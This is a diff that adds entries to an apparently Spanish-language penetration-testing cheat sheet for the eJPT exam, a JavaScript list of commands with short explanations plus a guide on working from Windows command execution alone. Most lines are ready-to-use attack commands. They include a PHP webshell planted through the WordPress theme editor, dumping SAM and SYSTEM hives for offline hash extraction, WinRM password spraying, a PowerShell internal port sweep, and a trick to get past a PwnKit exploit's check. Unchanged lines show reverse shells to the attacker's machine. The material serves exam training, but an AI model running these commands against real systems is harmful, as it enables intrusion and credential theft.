@@ -314,6 +314,9 @@ const D = [
   ["scan","Por qué un puerto está en ese estado","--reason explica si respondió, no respondió o fue filtrado","nmap --reason {IP}"],
   ["scan","Ver el porqué del escaneo en vivo","-vv da salida muy detallada mientras corre","nmap -p- -vv {IP}"],
   ["scan","Extraer lista de puertos de un reporte nmap","de un escaneo -oN ya guardado: coge las líneas de puerto, aísla el número, quita duplicados y los une con comas listos para -p","grep -E '^[0-9]' escaneo | cut -d/ -f1 | sort -u | xargs | tr ' ' ','"],
+  ["scan","Ver qué métodos de autenticación acepta SSH","si solo admite 'publickey' (sin 'password'), descarta directamente la fuerza bruta de contraseña en ese host","nmap -p22 --script ssh-auth-methods {IP}"],
+  ["scan","Fingerprint de RDP sin credenciales","confirma qué capas de seguridad soporta (NLA/CredSSP); no da la build exacta de Windows pero es gratis y no necesita login","nmap -p3389 --script rdp-enum-encryption {IP}"],
+  ["scan","Comprobar EternalBlue (MS17-010)","el script NSE puede fallar si la sesión SMB nula está bloqueada; el módulo de metasploit es más fiable en esos casos","msfconsole -q -x \"use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {IP}; run\""],
 
   // ===== 3. Web =====
   ["web","Escaneo de vulnerabilidades web","Nikto prueba miles de rutas y fallos conocidos (ficheros peligrosos, versiones vulnerables)","nikto -h http://{IP}"],
@@ -333,6 +336,7 @@ const D = [
   ["wordpress","Enumerar usuarios y plugins vulnerables","--enumerate u lista usuarios, vp lista plugins con vulnerabilidades conocidas","wpscan --url http://{IP} --enumerate u,vp"],
   ["wordpress","Enumerar solo los usuarios","saca los nombres de login válidos para después probar contraseñas contra ellos","wpscan --url http://{IP} --enumerate u"],
   ["wordpress","Fuerza bruta de contraseña","prueba cada contraseña de rockyou contra el usuario indicado vía XML-RPC","wpscan --url http://{IP} --usernames admin --passwords /usr/share/wordlists/rockyou.txt"],
+  ["wordpress","RCE con admin válido vía Editor de Temas","Apariencia → Editor de archivos de tema: edita un .php de un tema INSTALADO PERO INACTIVO (p. ej. 404.php de un theme que no es el activo) y mete una webshell — se ejecuta visitando esa ruta","<?php system($_GET['cmd']); ?>  ·  luego: curl 'http://{IP}/wp-content/themes/TEMA/404.php?cmd=id'"],
 
   // ===== 5. SMB / servicios =====
   ["services","Listar recursos SMB sin credenciales","-N intenta sesión nula (sin login): a veces expone los shares directamente","smbclient -L //{IP}/ -N"],
@@ -349,12 +353,17 @@ const D = [
   ["services","Rociar credenciales /24 con NetExec","prueba la credencial en toda la red; '(Pwn3d!)' marca dónde puedes ejecutar","nxc smb 10.10.10.0/24 -u usuario -p 'password'"],
   ["services","Ejecutar un comando por SMB (NetExec)","-x lanza un comando si la credencial tiene permisos de admin","nxc smb {IP} -u usuario -p 'password' -x whoami"],
   ["services","Volcar hashes SAM (NetExec)","--sam extrae los hashes locales si eres admin en el host","nxc smb {IP} -u usuario -p 'password' --sam"],
+  ["services","Volcar SAM+SYSTEM con solo un RCE (sin sesión interactiva)","si solo tienes ejecución de comandos (webshell) y no una shell real, guarda los hives en una ruta que puedas descargar por HTTP/FTP después","reg save HKLM\\SAM C:\\ruta\\accesible\\sam.save /y & reg save HKLM\\SYSTEM C:\\ruta\\accesible\\system.save /y"],
+  ["services","Extraer hashes NTLM de un SAM+SYSTEM ya descargado (offline)","LOCAL le dice a secretsdump que son hives ya volcados en tu Kali, no que se conecte a nada","impacket-secretsdump -sam sam.save -system system.save LOCAL"],
 
   // ===== 6. WinRM (5985/5986) =====
   ["winrm","Comprobar acceso WinRM","nxc valida si las credenciales sirven para WinRM; '(Pwn3d!)' = shell asegurada","nxc winrm {IP} -u usuario -p 'password'"],
   ["winrm","Shell interactiva con evil-winrm","la forma estándar de conseguir consola en Windows por el 5985","evil-winrm -i {IP} -u usuario -p 'password'"],
   ["winrm","evil-winrm con hash (pass-the-hash)","-H usa el hash NTLM en vez de la contraseña","evil-winrm -i {IP} -u usuario -H 'HASH_NTLM'"],
   ["winrm","Fuerza bruta WinRM con NetExec","prueba una lista de contraseñas contra el servicio WinRM","nxc winrm {IP} -u usuario -p /usr/share/wordlists/rockyou.txt"],
+  ["winrm","Ejecutar un comando por WinRM sin evil-winrm","-x manda el comando a cmd.exe; útil para comandos sueltos rápidos sin abrir sesión interactiva","nxc winrm {IP} -u usuario -p 'password' -x whoami"],
+  ["winrm","Ejecutar PowerShell por WinRM (NetExec)","-X (mayúscula) envía el comando a powershell.exe en vez de cmd — necesario para one-liners con variables, bucles o cmdlets","nxc winrm {IP} -u usuario -p 'password' -X \"ipconfig /all\""],
+  ["winrm","Cruce de varios usuarios x varias contraseñas por WinRM","prueba todas las combinaciones; se usa cuando ya tienes varias credenciales reales de otras máquinas y sospechas reutilización","nxc winrm {IP} -u user1 user2 user3 -p pass1 pass2 pass3"],
 
   // ===== 6. FTP =====
   ["ftp","Login anónimo a FTP","muchos FTP permiten usuario 'anonymous' con cualquier contraseña","ftp {IP}"],
@@ -368,6 +377,7 @@ const D = [
   ["dns","Transferencia de zona (AXFR)","si está mal configurada, vuelca todos los registros del dominio","dig @{IP} target.dl axfr"],
   ["dns","Fuerza bruta de subdominios","prueba nombres de un diccionario contra el DNS","dnsenum --dnsserver {IP} target.dl"],
   ["dns","Resolución inversa","obtiene el nombre asociado a una IP","dig -x {IP} @{IP}"],
+  ["dns","Resolución inversa desde dentro de un pivot (Windows)","útil para sacarle el hostname real a un host recién descubierto en la red interna y detectar convenciones de nombre","nslookup {IP} DNS_INTERNO"],
 
   // ===== 8. Bases de datos =====
   ["db","Conectar a MySQL","-h host, -u usuario; pedirá la contraseña","mysql -h {IP} -u root -p"],
@@ -454,6 +464,7 @@ const D = [
   ["access","Reverse shell con netcat (-e)","si la versión de nc soporta -e ejecuta la shell directamente contra tu Kali","nc {KIP} 4444 -e /bin/bash"],
   ["access","Reverse shell con mkfifo","alternativa cuando nc no tiene -e; conecta a tu Kali","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {KIP} 4444 >/tmp/f"],
   ["access","Bind shell (la víctima escucha)","cuando no puedes recibir conexiones: te conectas tú a ella","nc {IP} 4444"],
+  ["access","Usar un webshell ASPX que exige __VIEWSTATE","primero un GET para copiar los tokens del formulario, luego un POST con esos mismos tokens + el comando en el campo que use la webshell","curl -s http://{IP}/shell.aspx --data-urlencode \"__VIEWSTATE=...\" --data-urlencode \"__VIEWSTATEGENERATOR=...\" --data-urlencode \"__EVENTVALIDATION=...\" --data-urlencode \"txtArg=whoami\" --data-urlencode \"testing=excute\""],
 
   // ===== 17. Transferencia de archivos =====
   ["transfer","Servir ficheros por HTTP","levanta un servidor web en el 8000 sobre la carpeta actual","python3 -m http.server 8000"],
@@ -516,6 +527,8 @@ const D = [
   ["pivot","Alt · Redirigir un puerto con socat","reenvía tu 8080 a un puerto de un host interno inalcanzable directo","socat TCP-LISTEN:8080,fork TCP:10.10.10.15:80"],
   ["pivot","Alt · Túnel SSH dinámico (SOCKS)","-D abre un proxy SOCKS por la conexión SSH; combínalo con proxychains","ssh -D 1080 usuario@{IP}"],
   ["pivot","Alt · Port forward local por SSH","-L trae un puerto de un host interno directo a tu localhost","ssh -L 8080:10.10.10.15:80 usuario@{IP}"],
+  ["pivot","Alt · Barrido de puertos SIN nmap desde un pivot Windows (solo RCE/WinRM)","sockets TCP crudos con timeout corto vía PowerShell; sirve para descubrir hosts internos antes incluso de montar autoroute/SOCKS, ejecutándolo por WinRM en el propio pivot","foreach($o in 1..254){$ip='10.10.10.'+$o;foreach($p in 445,3389,22,80){$c=New-Object Net.Sockets.TcpClient;$iar=$c.BeginConnect($ip,$p,$null,$null);if($iar.AsyncWaitHandle.WaitOne(200) -and $c.Connected){\"$ip`:$p\"};$c.Close()}}"],
+  ["pivot","Alt · Lanzar ese barrido por NetExec sin evil-winrm","mismo one-liner que arriba, pero disparado en un solo comando desde tu Kali con -X, sin necesitar sesión interactiva en el pivot","nxc winrm {IP} -u usuario -p 'password' -X 'foreach($o in 1..254){$ip=\"10.10.10.\"+$o;foreach($p in 445,3389,22,80){$c=New-Object Net.Sockets.TcpClient;$iar=$c.BeginConnect($ip,$p,$null,$null);if($iar.AsyncWaitHandle.WaitOne(200) -and $c.Connected){\"$ip`:$p\"};$c.Close()}}'"],
 
   // ===== 21. Escalada de privilegios (Linux) =====
   ["privesc","Qué puedo ejecutar como sudo","lista los comandos que el usuario puede correr como root; el vector más rápido","sudo -l"],
@@ -531,6 +544,8 @@ const D = [
   ["privesc","Fuerza bruta de su root con una lista","prueba cada contraseña contra su root hasta dar con la de root — ojo, su a veces lee la contraseña de la TTY y no de stdin, puede no funcionar en todas las shells","while read p; do echo \"$p\" | timeout 2 su root -c 'id' 2>/dev/null | grep -q uid=0 && echo \"ROOT: $p\" && break; done < passwords.txt"],
   ["privesc","Extraer contraseñas de un binario SUID","strings sobre el binario privilegiado revela credenciales hardcodeadas","strings /usr/local/bin/task_manager | grep -iE 'pass|pwd|key'"],
   ["privesc","Escalada por grupo docker","si estás en el grupo docker, montas la raíz del host como root","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+  ["privesc","Comprobar versión de Polkit (PwnKit / CVE-2021-4034 / CVE-2021-3560)","pkexec con SUID + polkit sin parchear es privesc casi garantizada; busca el exploit correspondiente a la versión exacta con searchsploit","dpkg -l | grep polkit"],
+  ["privesc","Saltarse el chequeo \"SSH into localhost\" de algunos PoC de PwnKit","varios exploits públicos abortan si no detectan una sesión SSH real aunque el bug no lo necesite realmente; basta con simular esas dos variables antes de lanzarlo","export SSH_CLIENT='127.0.0.1 1 22'; export SSH_TTY=/dev/pts/0"],
 
   // ===== 22. Escalada de privilegios (Windows) =====
   ["winpriv","Información del sistema","versión y parches: base para buscar exploits de Windows","systeminfo"],
@@ -539,6 +554,9 @@ const D = [
   ["winpriv","Buscar contraseñas en ficheros","rastreo rápido de credenciales en texto","findstr /si password *.txt *.ini *.config"],
   ["winpriv","Servicios con ruta sin comillas","unquoted service path: vector de escalada clásico","wmic service get name,pathname,startmode | findstr /i auto"],
   ["winpriv","Comprobar AlwaysInstallElevated","si ambas claves están a 1, cualquier .msi se instala como SYSTEM: genera uno con msfvenom -f msi","reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"],
+  ["winpriv","Credenciales guardadas en el gestor de Windows","cmdkey lista conexiones RDP/red con credenciales cacheadas del usuario actual","cmdkey /list"],
+  ["winpriv","Historial de conexiones RDP guardadas (registro)","revela IPs/hostnames a los que ese usuario se ha conectado antes por escritorio remoto — pista directa de otras máquinas de la red","reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\""],
+  ["winpriv","Buscar en varias carpetas de usuario a la vez (findstr)","evita lanzarlo desde C:\\ a secas: los enlaces simbólicos de 'Documents and Settings' pueden meterte en un bucle infinito","findstr /si password C:\\Users\\Administrator\\*.* C:\\Users\\usuario\\*.*"],
 ];
 
 const META = {
@@ -791,6 +809,16 @@ const GUIDES = [
     "Contra la Víctima 2, <b>vuelve a empezar la metodología completa</b> como si fuera nueva.",
   ],"autoroute (o route add) solo vale DENTRO de msf. Para una web puntual usa portfwd; para herramientas externas como nmap/hydra necesitas sí o sí el SOCKS proxy + proxychains.",
   [["metodologia","Empezar de cero con la Víctima 2"]]],
+
+  ["🧩","Solo tengo RCE en Windows (sin Meterpreter todavía)","rce-only",[
+    "Antes de complicarte: confirma que puedes ejecutar comandos con <code>nxc smb</code> o <code>nxc winrm</code> (<code>-x</code> para cmd, <code>-X</code> mayúscula para PowerShell) con las credenciales que ya tengas.",
+    "¿Necesitas hashes NTLM? No hace falta mimikatz: <code>reg save HKLM\\SAM</code> y <code>HKLM\\SYSTEM</code> a una ruta descargable, bájalos y crackéalos offline con <code>impacket-secretsdump ... LOCAL</code>.",
+    "¿Es esta máquina el pivot? Mira <code>ipconfig /all</code> por RCE: si hay una segunda interfaz en otra subred, ya lo sabes sin necesitar sesión interactiva.",
+    "Sin nmap en el objetivo, puedes barrer la red interna igualmente: un one-liner de PowerShell con sockets TCP y timeout corto, lanzado vía <code>-X</code>.",
+    "Revisa credenciales guardadas del usuario: <code>cmdkey /list</code> y el registro de conexiones RDP (<code>HKCU\\...\\Terminal Server Client\\Servers</code>) — a veces ahí está la contraseña del siguiente salto.",
+    "Para explotar en serio esa red interna (fuerza bruta con hydra, nmap completo), al final sí conviene un Meterpreter real (p. ej. <code>psexec</code> con las credenciales que ya tienes) y montar autoroute + socks_proxy.",
+  ],"Se puede reconocer casi toda una red interna solo con RCE + NetExec, sin abrir ni una sesión interactiva. El Meterpreter/SOCKS hazlo cuando ya sepas qué atacar.",
+  [["pivot","Montar el SOCKS de verdad"],["winpriv","Seguir escalando en esta máquina"]]],
 
   ["🎯","Cómo enfocar el examen eJPT","examen",[
     "Lee la <b>Letter of Engagement</b>: alcance, IPs/redes permitidas y qué flags buscar. No te salgas de ahí.",
